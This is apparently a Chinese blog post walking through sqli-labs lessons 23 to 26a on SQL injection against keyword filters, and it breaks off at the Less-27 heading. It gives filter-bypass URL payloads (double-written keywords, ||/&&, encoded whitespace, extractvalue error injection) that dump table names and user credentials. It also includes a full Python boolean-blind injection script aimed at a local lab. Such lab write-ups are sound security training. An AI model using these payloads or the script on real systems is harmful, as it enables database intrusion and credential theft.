{"title":"SQL注入-关键字过滤的注入","uid":"91c80453ca147ce2ce8eeaf9436ba64b","slug":"SQL注入-关键字过滤的注入","date":"2022-02-08T15:40:16.000Z","updated":"2022-02-13T15:39:14.145Z","comments":true,"path":"api/articles/SQL注入-关键字过滤的注入.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>[TOC]</p>\n<h2 id=\"关键字过滤的注入\"><a href=\"#关键字过滤的注入\" class=\"headerlink\" title=\"关键字过滤的注入\"></a>关键字过滤的注入</h2><p>Less-23—Less-28a（Less-24除外）都是基于关键字过滤的注入，源码当中将<code>--，#，or，and</code>等关键字都过滤掉了，在这样的基础上进行 SQL注入。</p>\n<h2 id=\"Less-23\"><a href=\"#Less-23\" class=\"headerlink\" title=\"Less-23\"></a>Less-23</h2><p>由源码可以看到，接收到的<code>id</code>值将被函数<code>preg_replace()</code>进行过滤，若<code>id</code>值当中有<code>#和--</code>将被会替换为<code>&quot;&quot;</code>，以至于注释符不能使用。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220208234828450.png\" alt=\"image-20220208234828450\"></p>\n<p>没过滤时报错：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1&#39; --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220208235912625.png\" alt=\"image-20220208235912625\"></p>\n<p>过滤时报错：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;1&#39; --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209000031064.png\" alt=\"image-20220209000031064\"></p>\n<h2 id=\"具体步骤\"><a href=\"#具体步骤\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h2><p>探测注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>由于没有注释符，只能够将<code>sql</code>语句中的单引号闭合进行注入，这里回西安正常，注入成功。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209000146410.png\" alt=\"image-20220209000146410\"></p>\n<p>判断回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209001511727.png\" alt=\"image-20220209001511727\"></p>\n<p>爆库名和版本号：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,database(),&#39;version()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,version(),&#39;3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>由于第一条语句第三个字段闭合单引号后形成字符串被代入数据库执行，导致爆出的只是字符串，回显点只能利用第二个字段。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209001713576.png\" alt=\"image-20220209001713576\"></p>\n<p>爆表名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#39;3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>由于不能使用注释符，只能够在第二个回显字段进行嵌套子查询爆表名。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209002320153.png\" alt=\"image-20220209002320153\"></p>\n<p>爆列名：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),&#39;3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209002936700.png\" alt=\"image-20220209002936700\"></p>\n<p>爆内容：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),&#39;3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209003131337.png\" alt=\"image-20220209003131337\"></p>\n<hr>\n<h2 id=\"Less-25\"><a href=\"#Less-25\" class=\"headerlink\" title=\"Less-25\"></a>Less-25</h2><p>源码中，<code>id</code>值将<code>or</code>和<code>and</code>关键字进行了过滤：</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209123042616.png\" alt=\"image-20220209123042616\"></p>\n<h2 id=\"绕过思路\"><a href=\"#绕过思路\" class=\"headerlink\" title=\"绕过思路\"></a>绕过思路</h2><p>1、绕过<code>or</code>和<code>and</code>一般思路：</p>\n<p>（1）大小写变形 <code>Or,OR,oR</code> </p>\n<p>（2）编码，<code>hex，urlencode</code> </p>\n<p>（3）内联注释<code>/*or*/</code> </p>\n<p>（4）利用符号 <code>and=&amp;&amp; or=||</code></p>\n<p>（5）双写绕过<code>oorr</code>,<code>aandnandd</code></p>\n<p>2、由于对空格的过滤，可以使用：</p>\n<p><code>%09 TAB 键（水平）</code> </p>\n<p><code>%0a 新建一行</code> </p>\n<p><code>%0c 新的一页</code> </p>\n<p><code>%0d return 功能</code> </p>\n<p><code>%0b TAB 键（垂直）</code> </p>\n<p><code>%a0 空格</code></p>\n<p>内联注释举例：</p>\n<p><strong>&#x2F;* *&#x2F; 在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行</strong>，如图：</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209124343808.png\" alt=\"image-20220209124343808\"></p>\n<h2 id=\"具体步骤-1\"><a href=\"#具体步骤-1\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h2><p>这里使用<code>and=&amp;&amp; or=||</code>进行绕过：<br>判断注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; || 1&#x3D;1 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209125309356.png\" alt=\"image-20220209125309356\"></p>\n<p>判断字段数：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;1&#39; oorrder by 4--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>判断字段数时由于<code>order</code>字段有关键字<code>or</code>，这里使用双写绕过。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209125448678.png\" alt=\"image-20220209125448678\"></p>\n<p>判断回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2,3--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆库爆版本号：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,database(),version()S--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆表：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;database() limit 0,1),3--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆字段：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),3--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆内容：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(username,&#39;:&#39;,passwoorrd) from security.users--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<hr>\n<h2 id=\"Less-25a\"><a href=\"#Less-25a\" class=\"headerlink\" title=\"Less-25a\"></a>Less-25a</h2><p>源码中没有对<code>id</code>值做任何处理，这里使用双写绕过。</p>\n<p>这里还对报错回显进行了过滤，报错注入不能用。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209131453709.png\" alt=\"image-20220209131453709\"></p>\n<h2 id=\"具体步骤-2\"><a href=\"#具体步骤-2\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h2><p>判断注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25a&#x2F;?id&#x3D;1 aandnandd 1&#x3D;1 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209131348169.png\" alt=\"image-20220209131348169\"></p>\n<p>判断回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,3 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209131643275.png\" alt=\"image-20220209131643275\"></p>\n<p>（<code>union</code>字段前面的语句不是为了报错，要使用正确的语法但不存在的字段）</p>\n<p>这里除了使用联合注入，还可以使用时间盲注和布尔盲注。</p>\n<hr>\n<h2 id=\"Less-26\"><a href=\"#Less-26\" class=\"headerlink\" title=\"Less-26\"></a>Less-26</h2><p>源码中过滤如下：</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209132949609.png\" alt=\"image-20220209132949609\"></p>\n<p>这里的思路应该是将Less-23和Less-25的payload结合一下即可。</p>\n<h2 id=\"具体步骤-3\"><a href=\"#具体步骤-3\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h2><p>判断注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;1&#39; oorr &#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209133231652.png\" alt=\"image-20220209133231652\"></p>\n<p>判断字段数：</p>\n<p>由于对空格的过滤，可以使用：</p>\n<p><code>%09 TAB 键（水平）</code> </p>\n<p><code>%0a 新建一行</code> </p>\n<p><code>%0c 新的一页</code> </p>\n<p><code>%0d return 功能</code> </p>\n<p><code>%0b TAB 键（垂直）</code> </p>\n<p><code>%a0 空格</code></p>\n<p>这些编码进行绕过，但由于window下apache解析的问题，这些编码都不能进行解析，导致绕过失败（可以放在linux平台下，这些编码都可进行绕过）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;1&#39;%0b oorrder%0bby%0b&#39;4<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209135200276.png\" alt=\"image-20220209135200276\"></p>\n<p>由于判断字段数或者联合注入这些payload都避免不了用到空格，所以这里使用报错注入。</p>\n<p>爆库：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(database()),0x7e))||&#39;1&#39;&#x3D;&#39;2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里使用双写绕过的话会使用到<code>空格</code>，所以，在使用<code>oorr</code>的地方使用<code>||</code>进行绕过</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209140223254.png\" alt=\"image-20220209140223254\"></p>\n<p>爆表：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;database())),0x7e))||&#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里爆表的时候由于不能使用空格，每一条查询语句只能够使用<code>()</code>来代替。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209141154698.png\" alt=\"image-20220209141154698\"></p>\n<p>爆字段：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e))||&#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>爆内容：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(username))from(users)),0x7e))||&#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(password))from(users)),0x7e))||&#39;1&#39;&#x3D;&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<hr>\n<h2 id=\"Less-26a\"><a href=\"#Less-26a\" class=\"headerlink\" title=\"Less-26a\"></a>Less-26a</h2><p>源码将报错过滤掉，导致报错注入失效：</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209144348906.png\" alt=\"image-20220209144348906\"></p>\n<h2 id=\"具体步骤-4\"><a href=\"#具体步骤-4\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h2><p>判断注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26a&#x2F;?id&#x3D;1&#39;)||(&#39;1&#39;)&#x3D;(&#39;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5.htm/image-20220209144158468.png\" alt=\"image-20220209144158468\"></p>\n<p>这里报错注入用不了，在windows平台下使用时间盲注或者布尔盲注进行注入，使用编码注入只能换到linux平台下进行，payload与以往相同。</p>\n<p>布尔盲注脚本：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> requests\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">getPayload</span><span class=\"token punctuation\">(</span>char_index<span class=\"token punctuation\">,</span> <span class=\"token builtin\">ascii</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 系统表中数据</span>\n    info_database_name <span class=\"token operator\">=</span> <span class=\"token string\">\"infoorrmation_schema\"</span>\n    info_table_name <span class=\"token operator\">=</span> <span class=\"token string\">\"schemata\"</span> <span class=\"token comment\"># schemata / tables / columns</span>\n    info_column_name <span class=\"token operator\">=</span> <span class=\"token string\">\"schema_name\"</span> <span class=\"token comment\"># schema_name / table_name / column_name</span>\n    \n    <span class=\"token comment\"># 注入表中数据</span>\n    database_name <span class=\"token operator\">=</span> <span class=\"token string\">\"security\"</span>\n    table_name <span class=\"token operator\">=</span> <span class=\"token string\">\"users\"</span>\n    column_name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"passwoorrd\"</span><span class=\"token punctuation\">]</span>\n    \n    <span class=\"token comment\"># 附加url</span>\n    start_str <span class=\"token operator\">=</span> <span class=\"token string\">\"1'%26%26\"</span>\n    end_str <span class=\"token operator\">=</span> <span class=\"token string\">\"||'1'='\"</span>\n    \n    <span class=\"token comment\"># 连接select</span>\n    where_str <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n    <span class=\"token comment\">#where_str = \"where(table_schema='\"+database_name+\"'%26%26table_name='\"+table_name+\"')\"</span>\n    select_str <span class=\"token operator\">=</span> <span class=\"token string\">\"select(group_concat(\"</span><span class=\"token operator\">+</span>info_column_name<span class=\"token operator\">+</span><span class=\"token string\">\"))from(\"</span><span class=\"token operator\">+</span>info_database_name<span class=\"token operator\">+</span><span class=\"token string\">\".\"</span><span class=\"token operator\">+</span>info_table_name<span class=\"token operator\">+</span><span class=\"token string\">\")\"</span><span class=\"token operator\">+</span>where_str\n    <span class=\"token comment\">#select_str = \"select(group_concat(concat_ws('$',\"+column_name[0]+\",\"+column_name[1]+\",\"+column_name[2]+\")))from(\"+table_name+\")\"</span>\n    \n    <span class=\"token comment\"># 连接payload</span>\n    sqli_str <span class=\"token operator\">=</span> <span class=\"token string\">\"(ascii(mid((\"</span><span class=\"token operator\">+</span>select_str<span class=\"token operator\">+</span><span class=\"token string\">\"),\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>char_index<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\",1))>\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ascii</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\")\"</span>\n    payload <span class=\"token operator\">=</span> start_str <span class=\"token operator\">+</span> sqli_str <span class=\"token operator\">+</span> end_str\n    <span class=\"token keyword\">return</span> payload\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span>char_index<span class=\"token punctuation\">,</span> <span class=\"token builtin\">ascii</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 连接url</span>\n    url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost:8088/sqlilabs/Less-26/?id=\"</span>\n    exec_url <span class=\"token operator\">=</span> url <span class=\"token operator\">+</span> getPayload<span class=\"token punctuation\">(</span>char_index<span class=\"token punctuation\">,</span> <span class=\"token builtin\">ascii</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#print(exec_url)</span>\n    <span class=\"token comment\"># 检查回显</span>\n    echo <span class=\"token operator\">=</span> <span class=\"token string\">\"Your Login name\"</span>\n    content <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>exec_url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text\n    <span class=\"token keyword\">if</span> echo <span class=\"token keyword\">in</span> content<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dichotomy</span><span class=\"token punctuation\">(</span>char_index<span class=\"token punctuation\">,</span> left<span class=\"token punctuation\">,</span> right<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> left <span class=\"token operator\">&lt;</span> right<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># 二分法</span>\n        <span class=\"token builtin\">ascii</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>left<span class=\"token operator\">+</span>right<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> execute<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>char_index<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ascii</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            left <span class=\"token operator\">=</span> <span class=\"token builtin\">ascii</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            right <span class=\"token operator\">=</span> <span class=\"token builtin\">ascii</span>\n        <span class=\"token comment\"># 结束二分</span>\n        <span class=\"token keyword\">if</span> left <span class=\"token operator\">==</span> right<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> execute<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>char_index<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ascii</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token builtin\">ascii</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n                <span class=\"token keyword\">break</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ascii</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> <span class=\"token builtin\">len</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 查询结果的长度</span>\n        char <span class=\"token operator\">=</span> dichotomy<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">126</span><span class=\"token punctuation\">)</span> \n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">31</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 单条查询结果已被遍历</span>\n            <span class=\"token keyword\">break</span>\n        sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">)</span>\n        sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\r\\n\"</span><span class=\"token punctuation\">)</span>\n    sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>参考原文：<a href=\"https://www.jianshu.com/p/ff72f2c6d99c\">https://www.jianshu.com/p/ff72f2c6d99c</a></p>\n<hr>\n<h2 id=\"Less-27\"><a href=\"#Less-27\" class=\"headerlink\" 